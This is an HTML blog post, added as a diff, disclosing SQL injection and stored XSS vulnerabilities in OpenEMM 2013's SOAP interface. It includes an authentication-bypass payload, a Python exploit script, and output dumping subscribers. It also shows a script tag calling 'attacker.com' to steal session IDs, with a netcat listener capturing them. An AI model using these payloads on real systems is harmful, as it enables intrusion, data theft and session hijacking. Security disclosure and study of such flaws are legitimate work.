@@ -1,0 +1,447 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>OpenEMM-2013 SOAP SQLi/Stored XSS - </title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="OpenEMM is one of the most popular enterprise-grade email marketing software currently on the market; the best part of it, too, is that it&rsquo;s &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <!--<header role="banner"><hgroup>
+  <h1><a href="/"></a></h1>
+  
+</hgroup>
+
+</header>-->
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">OpenEMM-2013 SOAP SQLi/Stored XSS</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-07-28T22:24:15-07:00" pubdate data-updated="true">Jul 28<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p><a href="http://www.openemm.org/">OpenEMM</a> is one of the most popular enterprise-grade email marketing software currently on the market; the best part of it, too, is that it&rsquo;s free and open source.  The entire stack is java, with some random shell/Python scripts for configuration.  On inspection of the software, it appeared there were several SQL injection vulnerabilities due in part to a lack of input sanitation.  This vulnerability was privately disclosed to the vendor, and a patch will be released shortly and backported to OpenEMM 2013 and 2011.</p>
+
+<p>Paramaterized queries are not used consistently throughout the application; there are instances of paramterized queries, queries with basic sanitization, and queries without sanitization at all.  SQL queries are sanitized with the following function (SafeString.java):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>  /**
+</span><span class='line'>     * Gets the SQL string.
+</span><span class='line'>     */
+</span><span class='line'>    public static String getSQLSafeString(String input) {
+</span><span class='line'>        if (input == null) {
+</span><span class='line'>            return " ";
+</span><span class='line'>        } else {
+</span><span class='line'>            return input.replace("'", "''");
+</span><span class='line'>        }
+</span><span class='line'>    }</span></code></pre></td></tr></table></div></figure>
+
+
+<p></p>
+
+<p>This function inadequately sanitizes input.  The following malicious input would successfully slip through:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>\' AND UNION SELECT 1,2,3;-- </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Which, when inserted into an example query <code>SELECT * FROM admin WHERE username = '$user';</code> becomes
+<code>SELECT * FROM admin WHERE username = '\'' AND UNION SELECT 1,2,3;-- ';</code></p>
+
+<p>This sanitation function is used throughout OpenEMM, and any OpenEMM server exposing WSDL, or Web Services Description Language, is vulnerable.  A default OpenEMM installation exposes a handful of useful functions that allow a remote application/user access to various tables in the database.  Each function requires authentication, which runs through the following routine (WebServiceBase.java):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>protected boolean authenticateUser(MessageContext msct, String user, String pwd, int companyID) {
+</span><span class='line'>        boolean result=false;
+</span><span class='line'>        Connection dbConn=this.getConnection(msct);
+</span><span class='line'>        Statement agnStatement=null;
+</span><span class='line'>        ResultSet rset=null;
+</span><span class='line'>        
+</span><span class='line'>        try {
+</span><span class='line'>            agnStatement=dbConn.createStatement();
+</span><span class='line'>            rset=agnStatement.executeQuery("select a.ws_admin_id from ws_admin_tbl a where a.username='"+SafeString.getSQLSafeString(user)+"' and a.password='"+SafeString.getSQLSafeString(pwd)+"'");
+</span><span class='line'>            if(rset!=null && rset.next()) {
+</span><span class='line'>                result=true;
+</span><span class='line'>            } else {
+</span><span class='line'>                result=false;
+</span><span class='line'>                HttpServletRequest req=(HttpServletRequest)msct.getProperty("transport.http.servletRequest");
+</span><span class='line'>                log.info(req.getRemoteAddr()+" -0-l: login failed: "+user+" "+companyID);
+</span><span class='line'>            }</span></code></pre></td></tr></table></div></figure>
+
+
+<p>As shown, the vulnerable <code>getSQLSafeString</code> method is used in an attempt to sanitize input before building and executing the query.  This leads to a very trivial authentication bypass vulnerability, allowing any malicious user access to every WSDL function (found at <code>http://yourhost.com/emm_webservices</code>).</p>
+
+<p>The following code will bypass SOAP authentication and add a new mailing list:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>from SOAPpy import WSDL
+</span><span class='line'>
+</span><span class='line'>wsdl_file = "./ws.wsdl"
+</span><span class='line'>sploit = "\\' OR 1=1;-- "
+</span><span class='line'>
+</span><span class='line'>_server = WSDL.Proxy(wsdl_file)
+</span><span class='line'>ret = _server.addMailinglist("wsadmin", sploit, "w00t", "w00t")
+</span><span class='line'>if ret &gt; 0:
+</span><span class='line'>    print 'success (%d)'%ret</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This requires a very basic WSDL file, which is included with an OpenEMM installation as well as the bottom of this post.  I&rsquo;ve included exploit code that exploits several of these functions:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python openemm_wsdl.py -h
+</span><span class='line'>usage: openemm_wsdl.py [-h] -i HOST [-s] [-m MLIST] [--dm] [--ds]
+</span><span class='line'>
+</span><span class='line'>optional arguments:
+</span><span class='line'>  -h, --help  show this help message and exit
+</span><span class='line'>  -i HOST     server address
+</span><span class='line'>  -s          fetch all subscribers
+</span><span class='line'>  -m MLIST    create new mailing list (XSS)
+</span><span class='line'>  --dm        delete all mailing lists
+</span><span class='line'>  --ds        delete all subscribers
+</span><span class='line'>root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -s
+</span><span class='line'>&lt;SOAPpy.Types.structType multiRef at 30449464&gt;: {'x': ['2013', '2013-06-29 17:54:02', 'Last', 'First', '2', '29', '0', '17', '2013', '2013-06-29 17:54:02', '', '1', '54', '6', 'first.last@domain.org', '2', '6', '29', '54', '0', '17', '1']}
+</span><span class='line'>&lt;SOAPpy.Types.structType multiRef at 30446728&gt;: {'x': ['2013', '2013-06-29 17:54:02', 'Name', 'No', '2', '29', '0', '17', '2013', '2013-06-29 17:54:02', '', '1', '54', '6', 'no.name@yourdomain.com', '2', '6', '29', '54', '0', '17', '2']}
+</span><span class='line'>[!] Discovered 2 subscribers
+</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Our &ldquo;end goal&rdquo; for this exploit is, however, not just adding mailing lists or deleting content; we&rsquo;d like to obtain a web shell.  As OpenEMM is written in Java (struts), Java Server Pages (JSP) are invoked server-side to render client-side pages.  Theoretically, we should be able to dump a malicious JSP file into a readable/writable directory and obtain a remote shell.</p>
+
+<p>Unfortunately (fortunately for users/OpenEMM, though), the user used to connect to the MySQL database does not have FILE permissions:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; select user();
+</span><span class='line'>+-------------------+
+</span><span class='line'>| user()            |
+</span><span class='line'>+-------------------+
+</span><span class='line'>| agnitas@localhost |
+</span><span class='line'>+-------------------+
+</span><span class='line'>1 row in set (0.00 sec)
+</span><span class='line'>
+</span><span class='line'>mysql&gt; show grants;
+</span><span class='line'>+----------------------------------------------------------------------------------------------------------------------------------------------------+
+</span><span class='line'>| Grants for agnitas@localhost                                                                                                                       |
+</span><span class='line'>+----------------------------------------------------------------------------------------------------------------------------------------------------+
+</span><span class='line'>| GRANT USAGE ON *.* TO 'agnitas'@'localhost' IDENTIFIED BY PASSWORD '*BC428C4FAA04992D1E8CF04545DD70FA60E588C5'                                     |
+</span><span class='line'>| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON `openemm`.* TO 'agnitas'@'localhost'     |
+</span><span class='line'>| GRANT SELECT, INSERT, UPDATE, DELETE, CREATE, DROP, INDEX, ALTER, CREATE TEMPORARY TABLES, LOCK TABLES ON `openemm_cms`.* TO 'agnitas'@'localhost' |
+</span><span class='line'>+----------------------------------------------------------------------------------------------------------------------------------------------------+
+</span><span class='line'>3 rows in set (0.00 sec)
+</span><span class='line'>
+</span><span class='line'>mysql&gt; </span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is the user specified by <code>webapps/openemm/WEB-INF/classes/emm.properties</code>.  As shown, we have only basic access to the databases.  In the event that this user and permissions are modified, it is possible to upload a web shell, but in its default state, you cannot.</p>
+
+<p>From this SQL injection, then, we have authentication bypass and information disclosure.  Because this interface inserts data directly into databases, and does not go through a unified channel (i.e. for their basic sanitation methods), several fields are vulnerable to XSS, including a new mailing list&rsquo;s Description field:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# python openemm_wsdl.py -i 192.168.1.83 -m w00t
+</span><span class='line'>[!] Description field vulnerable to stored xss!
+</span><span class='line'>[!] Enter mlist description: &lt;script&gt;alert('XSS!')&lt;/script&gt;
+</span><span class='line'>[!] Saved successfully
+</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>
+
+
+<p><img class="center" src="http://2.bp.blogspot.com/-lYlTr36HnSM/Uer_nBvALcI/AAAAAAAAAhY/vtunAxjrjfs/s640/xss.jpg"></p>
+
+<p>With this, we can siphon off session ID&rsquo;s by simply injecting <code>&lt;script src="http://attacker.com"/&gt;</code>.  We do not need to send document.cookie because, surprise, session ID&rsquo;s are not stored as a cookie, but rather passed around through each GET/POST request.  Therefore, the Referrer header will contain the jsessionid required to hijack the session.  Our hijacked request looks as such:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@jali:~/exploits# nc -l -p 80
+</span><span class='line'>GET / HTTP/1.1
+</span><span class='line'>Host: 192.168.1.147
+</span><span class='line'>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0
+</span><span class='line'>Accept: */*
+</span><span class='line'>Accept-Language: en-US,en;q=0.5
+</span><span class='line'>Accept-Encoding: gzip, deflate
+</span><span class='line'>DNT: 1
+</span><span class='line'>Referer: http://192.168.1.83:8080/mailinglist.do;jsessionid=CBD95DD7B9B1ABF9C8922BC2DC5047E3?action=1
+</span><span class='line'>Connection: keep-alive
+</span><span class='line'>
+</span><span class='line'>^C
+</span><span class='line'>root@jali:~/exploits# </span></code></pre></td></tr></table></div></figure>
+
+
+<p>We then simply make the same request in the Referrer field and we&rsquo;ve got access to the account.</p>
+
+<p><a href="http://pastebin.com/JLh7BYYj">Exploit</a><br/>
+<a href="http://pastebin.com/GXdw3FcQ">wsdl</a></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-07-28T22:24:15-07:00" pubdate data-updated="true">Jul 28<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/openemm/'>openemm</a>, <a class='category' href='/blog/categories/sqli/'>sqli</a>, <a class='category' href='/blog/categories/xss/'>xss</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss/" data-via="" data-counturl="http://hatRiot.github.io/blog/2013/07/28/openemm-2013-soap-sqli-slash-stored-xss/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2013/07/10/solving-ra1nxing-bots/" title="Previous Post: solving RA1NXing Bots">&laquo; solving RA1NXing Bots</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2013/10/14/dolibarr-3.4.0-multiple-vulnerabilities/" title="Next Post: Dolibarr 3.4.0 - Multiple Vulnerabilities">Dolibarr 3.4.0 - Multiple Vulnerabilities &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/19/abusing-delay-load-dll/">Abusing delay load DLLs for remote code injection</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/06/ntpdc-exploit/">ntpdc local buffer overflow</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/protostar-network/">Protostar solutions - Network</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/21/protostar-heap-exploits/">Protostar solutions - Heap Exploitation</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
